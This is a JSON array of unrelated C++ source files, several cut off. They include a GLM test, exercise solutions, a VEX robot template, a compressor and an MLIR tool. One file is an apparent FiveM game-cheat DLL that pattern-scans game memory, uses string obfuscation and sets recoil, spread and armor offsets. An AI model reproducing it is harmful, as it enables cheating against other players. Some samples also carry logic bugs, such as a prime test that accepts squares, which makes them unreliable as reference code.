[
    "#define GLM_ENABLE_EXPERIMENTAL\n#include <glm/vec2.hpp>\n#include <glm/vec3.hpp>\n#include <glm/vec4.hpp>\n#include <glm/gtx/vector_query.hpp>\n\nint test_areCollinear()\n{\n\tint Error(0);\n\n\t{\n\t\tbool TestA = glm::areCollinear(glm::vec2(-1), glm::vec2(1), 0.00001f);\n\t\tError += TestA ? 0 : 1;\n\t}\n\n\t{\n\t\tbool TestA = glm::areCollinear(glm::vec3(-1), glm::vec3(1), 0.00001f);\n\t\tError += TestA ? 0 : 1;\n\t}\n\n\t{\n\t\tbool TestA = glm::areCollinear(glm::vec4(-1), glm::vec4(1), 0.00001f);\n\t\tError += TestA ? 0 : 1;\n\t}\n\n\treturn Error;\n}\n\nint test_areOrthogonal()\n{\n\tint Error(0);\n\t\n\tbool TestA = glm::areOrthogonal(glm::vec2(1, 0), glm::vec2(0, 1), 0.00001f);\n\tError += TestA ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_isNormalized()\n{\n\tint Error(0);\n\t\n\tbool TestA = glm::isNormalized(glm::vec4(1, 0, 0, 0), 0.00001f);\n\tError += TestA ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_isNull()\n{\n\tint Error(0);\n\t\n\tbool TestA = glm::isNull(glm::vec4(0), 0.00001f);\n\tError += TestA ? 0 : 1;\n\n\treturn Error;\n}\n\nint test_areOrthonormal()\n{\n\tint Error(0);\n\n\tbool TestA = glm::areOrthonormal(glm::vec2(1, 0), glm::vec2(0, 1), 0.00001f);\n\tError += TestA ? 0 : 1;\n\n\treturn Error;\n}\n\nint main()\n{\n\tint Error(0);\n\n\tError += test_areCollinear();\n\tError += test_areOrthogonal();\n\tError += test_isNormalized();\n\tError += test_isNull();\n\tError += test_areOrthonormal();\n\n\treturn Error;\n}\n\n\n",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\n// Function to calculate the typing time for a given string\r\nint calculateTypingTime(const string &s) {\r\n    int time = 2; // Time to type the first character\r\n    for (int i = 1; i < s.length(); ++i) {\r\n        if (s[i] == s[i-1]) {\r\n            time += 1; // Same character as previous\r\n        } else {\r\n            time += 2; // Different character\r\n        }\r\n    }\r\n    return time;\r\n}\r\n\r\nint main() {\r\n    int t;\r\n    cin >> t;\r\n    while (t--) {\r\n        string s;\r\n        cin >> s;\r\n        \r\n        string best_password = \"\";\r\n        int max_time = 0;\r\n\r\n        // Try inserting every possible lowercase Latin letter at every possible position\r\n        for (char c = 'a'; c <= 'z'; ++c) {\r\n            for (int i = 0; i <= s.length(); ++i) {\r\n                string new_password = s.substr(0, i) + c + s.substr(i);\r\n                int typing_time = calculateTypingTime(new_password);\r\n                \r\n                if (typing_time > max_time) {\r\n                    max_time = typing_time;\r\n                    best_password = new_password;\r\n                }\r\n            }\r\n        }\r\n\r\n        cout << best_password << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\r\n#include <cstdio>\r\n#include <cctype>\r\n#include <string>\r\n#include <vector>\r\n#include <fstream>\r\n\r\nusing namespace std;\r\n\r\n// Define assembly instruction templates\r\nconst string ASM_HEADER = \".386\\n.model flat, stdcall\\noption casemap :none\\n\\n\"\r\n                          \"include \\\\masm32\\\\include\\\\kernel32.inc\\n\"\r\n                          \"include \\\\masm32\\\\include\\\\masm32.inc\\n\"\r\n                          \"includelib \\\\masm32\\\\lib\\\\kernel32.lib\\n\"\r\n                          \"includelib \\\\masm32\\\\lib\\\\masm32.lib\\n\\n\"\r\n                          \".data\\n\";\r\nconst string ASM_CODE_START = \".code\\nmain:\\n\";\r\nconst string ASM_CODE_END = \"    invoke ExitProcess, 0\\nend main\\n\";\r\n\r\n// Assembly Instructions Structure\r\nstruct AssemblyInstruction {\r\n    string instruction;\r\n    string operand;  // For constants or identifiers\r\n};\r\n\r\nvector<AssemblyInstruction> assembly_code;\r\nvector<string> data_section;\r\n\r\n// Code Generator for Assembly\r\nvoid generate_asm_code(const string &instruction, const string &operand = \"\") {\r\n    assembly_code.push_back({instruction, operand});\r\n}\r\n\r\nvoid generate_data_section(const string &label, const string &data) {\r\n    data_section.push_back(label + \" db \\\"\" + data + \"\\\", 0\");\r\n}\r\n\r\n// Lexer functions\r\ntypedef enum {\r\n    CLASS,\r\n    FUNCTION,\r\n    IDENTIFIER,\r\n    STRING_LITERAL,\r\n    OPEN_CURLY,\r\n    CLOSE_CURLY,\r\n    OPEN_PAREN,\r\n    CLOSE_PAREN,\r\n    SEMI,\r\n    PRINT_TOKEN\r\n} TokenType;\r\n\r\nstruct Token {\r\n    TokenType type;\r\n    string value;\r\n};\r\n\r\nbool is_separator(char c) {\r\n    return c == '{' || c == '}' || c == '(' || c == ')' || c == ';';\r\n}\r\n\r\nvoid print_token(const Token& token) {\r\n    cout << \"Token(\";\r\n    switch (token.type) {\r\n        case CLASS: cout << \"CLASS, value: \" << token.value; break;\r\n        case FUNCTION: cout << \"FUNCTION, value: \" << token.value; break;\r\n        case IDENTIFIER: cout << \"IDENTIFIER, value: \" << token.value; break;\r\n        case STRING_LITERAL: cout << \"STRING_LITERAL, value: \" << token.value; break;\r\n        case OPEN_CURLY: cout << \"OPEN_CURLY\"; break;\r\n        case CLOSE_CURLY: cout << \"CLOSE_CURLY\"; break;\r\n        case OPEN_PAREN: cout << \"OPEN_PAREN\"; break;\r\n        case CLOSE_PAREN: cout << \"CLOSE_PAREN\"; break;\r\n        case SEMI: cout << \"SEMI\"; break;\r\n        case PRINT_TOKEN: cout << \"PRINT\"; break;\r\n        default: cout << \"UNKNOWN\"; break;\r\n    }\r\n    cout << \")\\n\";\r\n}\r\n\r\n// Lexer function\r\nvoid Lexer(FILE *file, vector<Token> &tokens) {\r\n    char current_char = fgetc(file);\r\n    while (current_char != EOF) {\r\n        if (isspace(current_char)) {\r\n            current_char = fgetc(file);\r\n            continue;\r\n        }\r\n        if (is_separator(current_char)) {\r\n            Token token;\r\n            switch (current_char) {\r\n                case '{': token = {OPEN_CURLY, \"{\"}; break;\r\n                case '}': token = {CLOSE_CURLY, \"}\"}; break;\r\n                case '(': token = {OPEN_PAREN, \"(\"}; break;\r\n                case ')': token = {CLOSE_PAREN, \")\"}; break;\r\n                case ';': token = {SEMI, \";\"}; break;\r\n            }\r\n            tokens.push_back(token);\r\n            current_char = fgetc(file);\r\n            continue;\r\n        }\r\n        if (isalpha(current_char)) {\r\n            string word = \"\";\r\n            while (isalpha(current_char)) {\r\n                word += current_char;\r\n                current_char = fgetc(file);\r\n            }\r\n            if (word == \"class\") {\r\n                tokens.push_back({CLASS, word});\r\n            } else if (word == \"function\") {\r\n                tokens.push_back({FUNCTION, word});\r\n            } else if (word == \"print\") {\r\n                tokens.push_back({PRINT_TOKEN, word});\r\n            } else {\r\n                tokens.push_back({IDENTIFIER, word});\r\n            }\r\n            continue;\r\n        }\r\n        if (current_char == '\"') {\r\n            string str_literal = \"\";\r\n            current_char = fgetc(file);\r\n            while (current_char != '\"' && current_char != EOF) {\r\n                str_literal += current_char;\r\n                current_char = fgetc(file);\r\n            }\r\n            tokens.push_back({STRING_LITERAL, str_literal});\r\n            current_char = fgetc(file);\r\n            continue;\r\n        }\r\n        current_char = fgetc(file);\r\n    }\r\n}\r\n\r\n// Parser function\r\nvoid Parser(vector<Token> &tokens) {\r\n    int pos = 0;\r\n    if (tokens[pos].type == CLASS) {\r\n        pos++;\r\n        if (tokens[pos].type == IDENTIFIER && tokens[pos].value == \"Main\") {\r\n            pos++;\r\n            if (tokens[pos].type == OPEN_CURLY) {\r\n                pos++;\r\n                if (tokens[pos].type == FUNCTION) {\r\n                    pos++;\r\n                    if (tokens[pos].type == IDENTIFIER && tokens[pos].value == \"Main\") {\r\n                        pos++;\r\n                        if (tokens[pos].type == OPEN_PAREN) {\r\n                            pos++;\r\n                            if (tokens[pos].type == CLOSE_PAREN) {\r\n                      ",
    "#include \"main.h\"\n\n/**\n * A callback function for LLEMU's center button.\n *\n * When this callback is fired, it will toggle line 2 of the LCD text between\n * \"I was pressed!\" and nothing.\n */\nvoid on_center_button() {\n\tstatic bool pressed = false;\n\tpressed = !pressed;\n\tif (pressed) {\n\t\tpros::lcd::set_text(2, \"I was pressed!\");\n\t} else {\n\t\tpros::lcd::clear_line(2);\n\t}\n}\n\n/**\n * Runs initialization code. This occurs as soon as the program is started.\n *\n * All other competition modes are blocked by initialize; it is recommended\n * to keep execution time for this mode under a few seconds.\n */\nvoid initialize() {\n\tpros::lcd::initialize();\n\tpros::lcd::set_text(1, \"Hello PROS User!\");\n\n\tpros::lcd::register_btn1_cb(on_center_button);\n}\n\n/**\n * Runs while the robot is in the disabled state of Field Management System or\n * the VEX Competition Switch, following either autonomous or opcontrol. When\n * the robot is enabled, this task will exit.\n */\nvoid disabled() {}\n\n/**\n * Runs after initialize(), and before autonomous when connected to the Field\n * Management System or the VEX Competition Switch. This is intended for\n * competition-specific initialization routines, such as an autonomous selector\n * on the LCD.\n *\n * This task will exit when the robot is enabled and autonomous or opcontrol\n * starts.\n */\nvoid competition_initialize() {}\n\n/**\n * Runs the user autonomous code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the autonomous\n * mode. Alternatively, this function may be called in initialize or opcontrol\n * for non-competition testing purposes.\n *\n * If the robot is disabled or communications is lost, the autonomous task\n * will be stopped. Re-enabling the robot will restart the task, not re-start it\n * from where it left off.\n */\nvoid autonomous() {}\n\n/**\n * Runs the operator control code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the operator\n * control mode.\n *\n * If no competition control is connected, this function will run immediately\n * following initialize().\n *\n * If the robot is disabled or communications is lost, the\n * operator control task will be stopped. Re-enabling the robot will restart the\n * task, not resume it from where it left off.\n */\nvoid opcontrol() {\n\tpros::Controller master(pros::E_CONTROLLER_MASTER);\n\tpros::MotorGroup left_mg({1, -2, 3});    // Creates a motor group with forwards ports 1 & 3 and reversed port 2\n\tpros::MotorGroup right_mg({-4, 5, -6});  // Creates a motor group with forwards port 5 and reversed ports 4 & 6\n\n\n\twhile (true) {\n\t\tpros::lcd::print(0, \"%d %d %d\", (pros::lcd::read_buttons() & LCD_BTN_LEFT) >> 2,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_CENTER) >> 1,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_RIGHT) >> 0);  // Prints status of the emulated screen LCDs\n\n\t\t// Arcade control scheme\n\t\tint dir = master.get_analog(ANALOG_LEFT_Y);    // Gets amount forward/backward from left joystick\n\t\tint turn = master.get_analog(ANALOG_RIGHT_X);  // Gets the turn left/right from right joystick\n\t\tleft_mg.move(dir - turn);                      // Sets left motor voltage\n\t\tright_mg.move(dir + turn);                     // Sets right motor voltage\n\t\tpros::delay(20);                               // Run for 20 ms then update\n\t}\n}",
    "// B\u00e0i 2: Thi\u1ebft k\u1ebf gi\u1ea3i thu\u1eadt v\u00e0 c\u00e0i \u0111\u1eb7t \u0111\u1ec3 t\u1ea1o ra m\u1ed9t m\u1ea3ng s\u1ed1 n\u1eeda nguy\u00ean t\u1ed1 (Blum) nh\u1ecf h\u01a1n m\u1ed9t s\u1ed1 N cho tr\u01b0\u1edbc v\u00e0 th\u1ef1c hi\u1ec7n hai y\u00eau c\u1ea7u sau:\r\n// - T\u00ecm ra t\u1ea5t c\u1ea3 c\u00e1c c\u1eb7p s\u1ed1 Blum c\u00f3 t\u1ed5ng c\u0169ng l\u00e0 m\u1ed9t s\u1ed1 Blum nh\u1ecf h\u01a1n N\r\n// - Ki\u1ec3m tra xem m\u1ed9t s\u1ed1 Blum M c\u00f3 t\u1ed3n t\u1ea1i trong d\u00e3y s\u1ed1 Blum \u0111\u01b0\u1ee3c t\u1ea1o ra hay kh\u00f4ng.\r\n#include <iostream>\r\n#include <cmath>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\n// Ham kiem tra so nguyen to\r\nbool Prime(int n){\r\n    if (n<2)\r\n        return 0;\r\n    else {\r\n        for(int i=2; i < sqrt(n); i++){\r\n            if(n % i == 0)\r\n                return 0;\r\n        }\r\n    } \r\n    return 1;\r\n}\r\n\r\n// Ham kiem tra so nua nguyen to (blum)\r\nbool blumPrime(int p){\r\n    return Prime(p) && (p % 4 == 3);\r\n}\r\n\r\n// mang dong chua cac so nua nguyen to\r\nvector<int> blumNumbers(int N){\r\n    vector<int> vectorBlum;\r\n    for(int m=2; m<N; m++){\r\n        if(blumPrime(m)){\r\n            for(int n=m+1; n<N; n++){\r\n                if(blumPrime(n)){\r\n                    vectorBlum.push_back(m*n);\r\n                }\r\n            }\r\n        }\r\n    }\r\n    return vectorBlum;\r\n}\r\n\r\n// Ham kiem tra 1 so co phai so Blum hay khong\r\nbool isBlumNumber(int n, const vector<int>& vectorBlum) {\r\n    for (int blum : vectorBlum) {\r\n        if (blum == n) \r\n            return 1;\r\n    }\r\n    return 0;\r\n}\r\n\r\n// Tim cac tong trong mang la so Blum nho hon N\r\nvoid findBlum(vector<int>& vectorBlum, int N){\r\n    for (int i = 0; i < vectorBlum.size(); i++) {\r\n        for (int j = i + 1; j < vectorBlum.size(); j++){\r\n            int sum = vectorBlum[i] + vectorBlum[j];\r\n            if (sum < N && isBlumNumber(sum, vectorBlum)) {\r\n                cout << vectorBlum[i] << \" + \" << vectorBlum[j] << \" = \" << sum << endl;\r\n            }\r\n        } \r\n    }\r\n}\r\nint main(){\r\n    int N, M;\r\n    cout << \"Nhap N: \";\r\n    cin >> N;\r\n    vector<int> vectorBlum = blumNumbers(N);\r\n\r\n    cout << \"Day so Blum nho hon N la: \";\r\n    for(int num : vectorBlum){\r\n        cout << num << \" \";\r\n    }\r\n    cout << endl;\r\n\r\n    cout << \"Cac cap so Blum co tong cung la mot so Blum nho hon \" << N << \": \";\r\n    findBlum(vectorBlum, N);\r\n    cout << endl;\r\n\r\n    cout << \"Nhap M: \";\r\n    cin >> M;\r\n    if(isBlumNumber(M, vectorBlum))\r\n        cout << M << \" ton tai trong day so Blum\";\r\n    else\r\n        cout << M << \" khong ton tai trong day so Blum\";\r\n    return 0;\r\n}\r\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include <iostream>\n#include <fstream>\n#include <zlib.h>\n#include <vector>\n#include <omp.h>\n#include <mutex>\n\nconst int CHUNK_SIZE = 1024;\nstd::mutex outfile_mutex; // To protect writing to the file\n\n// Function to compress a chunk of data\nvoid compressChunk(std::vector<char> inputBuffer, std::ofstream* outfile) {\n    z_stream deflateStream;\n    deflateStream.zalloc = Z_NULL;\n    deflateStream.zfree = Z_NULL;\n    deflateStream.opaque = Z_NULL;\n\n    if (deflateInit2(&deflateStream, Z_BEST_COMPRESSION, Z_DEFLATED, 15 + 16, 8, Z_DEFAULT_STRATEGY) != Z_OK) {\n        std::cerr << \"Failed to initialize compression!\" << std::endl;\n        return;\n    }\n\n    deflateStream.avail_in = inputBuffer.size();\n    deflateStream.next_in = reinterpret_cast<Bytef*>(inputBuffer.data());\n\n    char outBuffer[CHUNK_SIZE];\n    do {\n        deflateStream.avail_out = CHUNK_SIZE;\n        deflateStream.next_out = reinterpret_cast<Bytef*>(outBuffer);\n\n        deflate(&deflateStream, Z_NO_FLUSH);  // Compress the data\n\n        std::streamsize bytesCompressed = CHUNK_SIZE - deflateStream.avail_out;\n\n        // Thread-safe writing to the output file\n        outfile_mutex.lock();  // Lock the file to prevent multiple threads writing at once\n        outfile->write(outBuffer, bytesCompressed);  // Write compressed data to the file\n        outfile_mutex.unlock();  // Unlock after writing\n\n    } while (deflateStream.avail_out == 0);\n\n    // Final flush of compressed data\n    do {\n        deflateStream.avail_out = CHUNK_SIZE;\n        deflateStream.next_out = reinterpret_cast<Bytef*>(outBuffer);\n        deflate(&deflateStream, Z_FINISH);  // Finish compression\n        std::streamsize bytesCompressed = CHUNK_SIZE - deflateStream.avail_out;\n        outfile_mutex.lock();  // Lock the file for writing\n        outfile->write(outBuffer, bytesCompressed);  // Write final data\n        outfile_mutex.unlock();  // Unlock the file\n    } while (deflateStream.avail_out == 0);\n\n    deflateEnd(&deflateStream);\n}\n\n// Function to manage the compression of the file using OpenMP\nvoid compressFile(const std::string& sourceFile, const std::string& destinationFile, int numThreads) {\n    std::ifstream infile(sourceFile, std::ios::binary);  // Open the input file\n    std::ofstream outfile(destinationFile, std::ios::binary);  // Open the output file\n\n    if (!infile.is_open() || !outfile.is_open()) {\n        std::cerr << \"Error opening file.\" << std::endl;\n        return;\n    }\n\n    std::vector<std::vector<char>> chunks;  // To store all chunks of data\n    std::vector<char> buffer(CHUNK_SIZE);\n\n    // Read the file in chunks\n    while (infile.read(buffer.data(), buffer.size()) || infile.gcount() > 0) {\n        chunks.push_back(std::vector<char>(buffer.begin(), buffer.begin() + infile.gcount()));\n    }\n\n    // Use OpenMP to parallelize the compression of each chunk\n    #pragma omp parallel for num_threads(numThreads) schedule(dynamic)\n    for (int i = 0; i < chunks.size(); ++i) {\n        compressChunk(chunks[i], &outfile);  // Compress each chunk\n    }\n\n    infile.close();\n    outfile.close();\n    std::cout << \"File compressed successfully using OpenMP with \" << numThreads << \" threads!\" << std::endl;\n}\n\nint main() {\n    std::string sourceFile = \"example.txt\";  // The file you want to compress\n    std::string compressedFile = \"example_compressed.gz\";  // The output compressed file\n\n    int numThreads = 4;  // Number of threads to use\n    compressFile(sourceFile, compressedFile, numThreads);\n\n    return 0;\n}\n\n\n\n// g++-14 -fopenmp -o compress_file compress_file.cpp -lz\n\n// ./compress_file\n\n// https://www.zlib.net/manual.html\n// https://en.cppreference.com/w/cpp/io/basic_fstream\n\n// https://en.cppreference.com/w/cpp/thread/mutex",
    "//===-- substrait-translate.cpp - mlir-translate for Substrait --*- C++ -*-===//\n//\n// Licensed under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n// `mlir-stranslate` with translations to and from Substrait MLIR dialects.\n//===----------------------------------------------------------------------===//\n\n#include \"mlir/IR/BuiltinOps.h\"\n#include \"mlir/IR/Operation.h\"\n#include \"mlir/InitAllTranslations.h\"\n#include \"mlir/Support/LogicalResult.h\"\n#include \"mlir/Tools/mlir-translate/MlirTranslateMain.h\"\n#include \"mlir/Tools/mlir-translate/Translation.h\"\n#include \"substrait-mlir/Dialect/Substrait/IR/Substrait.h\"\n#include \"substrait-mlir/Target/SubstraitPB/Export.h\"\n#include \"substrait-mlir/Target/SubstraitPB/Import.h\"\n#include \"substrait-mlir/Target/SubstraitPB/Options.h\"\n#include \"llvm/Support/GraphWriter.h\"\n#include \"llvm/Support/raw_ostream.h\"\n\nnamespace mlir {\nnamespace substrait {\n\nllvm::cl::opt<SerdeFormat> substraitProtobufFormat(\n    \"substrait-protobuf-format\", llvm::cl::ValueRequired,\n    llvm::cl::desc(\n        \"Serialization format used when translating Substrait plans.\"),\n    llvm::cl::values(\n        clEnumValN(SerdeFormat::kText, \"text\", \"human-readable text format\"),\n        clEnumValN(SerdeFormat::kBinary, \"binary\", \"binary wire format\"),\n        clEnumValN(SerdeFormat::kJson, \"json\", \"compact JSON format\"),\n        clEnumValN(SerdeFormat::kPrettyJson, \"pretty-json\",\n                   \"JSON format with new lines\")),\n    llvm::cl::init(SerdeFormat::kText));\n\nstatic void registerSubstraitDialects(DialectRegistry &registry) {\n  registry.insert<mlir::substrait::SubstraitDialect>();\n}\n\nvoid registerSubstraitToProtobufTranslation() {\n  TranslateFromMLIRRegistration registration(\n      \"substrait-to-protobuf\", \"translate from Substrait MLIR to protobuf\",\n      [&](mlir::Operation *op, llvm::raw_ostream &output) {\n        ImportExportOptions options;\n        options.serdeFormat = substraitProtobufFormat.getValue();\n        return translateSubstraitToProtobuf(op, output, options);\n      },\n      registerSubstraitDialects);\n}\n\nvoid registerProtobufToSubstraitTranslation() {\n  TranslateToMLIRRegistration registration(\n      \"protobuf-to-substrait\", \"translate from protobuf to Substrait MLIR\",\n      [&](llvm::StringRef input, mlir::MLIRContext *context) {\n        ImportExportOptions options;\n        options.serdeFormat = substraitProtobufFormat.getValue();\n        return translateProtobufToSubstrait(input, context, options);\n      },\n      registerSubstraitDialects);\n}\n\n} // namespace substrait\n} // namespace mlir\n\nint main(int argc, char **argv) {\n  mlir::registerAllTranslations();\n  mlir::substrait::registerSubstraitToProtobufTranslation();\n  mlir::substrait::registerProtobufToSubstraitTranslation();\n\n  return failed(\n      mlir::mlirTranslateMain(argc, argv, \"MLIR Translation Testing Tool\"));\n}\n",
    "/**********************************************************************************************\n * Arduino PID Library - Version 1.2.1\n * by Brett Beauregard <br3ttb@gmail.com> brettbeauregard.com\n *\n * This Library is licensed under the MIT License\n **********************************************************************************************/\n\n#if ARDUINO >= 100\n  #include \"Arduino.h\"\n#else\n  #include \"WProgram.h\"\n#endif\n\n#include <PID_v1.h>\n\n/*Constructor (...)*********************************************************\n *    The parameters specified here are those for for which we can't set up\n *    reliable defaults, so we need to have the user set them.\n ***************************************************************************/\nPID::PID(double* Input, double* Output, double* Setpoint,\n        double Kp, double Ki, double Kd, int POn, int ControllerDirection)\n{\n    myOutput = Output;\n    myInput = Input;\n    mySetpoint = Setpoint;\n    inAuto = false;\n\n    PID::SetOutputLimits(0, 255);\t\t\t\t//default output limit corresponds to\n\t\t\t\t\t\t\t\t\t\t\t\t//the arduino pwm limits\n\n    SampleTime = 